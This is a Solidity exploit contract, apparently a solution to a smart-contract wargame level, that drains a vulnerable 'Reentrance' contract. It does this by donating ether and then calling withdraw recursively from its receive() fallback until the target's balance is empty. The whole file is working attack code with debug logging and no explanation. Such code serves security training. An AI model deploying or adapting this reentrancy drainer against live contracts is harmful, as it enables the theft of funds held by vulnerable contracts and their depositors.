// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "./Re-entrancy.sol";
import "forge-std/console.sol";

contract ReentranceHack {
    Reentrance reentrance;

    constructor(address _reentrance) {
        reentrance = Reentrance(payable(_reentrance));
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        console.log("1");
        console.log("balance", address(reentrance).balance);
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        console.log("balance", address(reentrance).balance);
        require(address(reentrance).balance > 0, "insufficient");
        console.log("2");
        reentrance.withdraw(msg.value);
    }
}
